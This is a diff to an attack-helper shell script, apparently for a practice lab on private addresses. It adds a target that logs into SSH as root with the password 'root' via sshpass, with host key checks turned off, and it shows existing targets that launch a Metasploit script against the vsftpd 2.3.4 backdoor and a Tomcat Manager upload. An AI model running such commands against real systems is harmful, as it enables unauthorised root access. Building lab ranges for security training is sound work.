@@ -18,10 +18,17 @@ case "$1" in
         echo "[*] Pwning vsftpd backdoor (172.20.0.15)..."
         msfconsole -q -r "$SCRIPTS_DIR/pwn-vsftpd.rc"
         ;;
+    ssh|vulnssh)
+        echo "[*] Pwning SSH with weak creds (172.20.0.17)..."
+        echo "[*] Password is 'root'"
+        echo ""
+        sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@172.20.0.17
+        ;;
     list|--list|-l)
         echo "Available targets:"
         echo "  tomcat  - Tomcat Manager upload (172.20.0.19)"
         echo "  vsftpd  - vsftpd 2.3.4 backdoor (172.20.0.15)"
+        echo "  ssh     - SSH weak password (172.20.0.17)"
         echo ""
         echo "Usage: pwn <target>"
         ;;
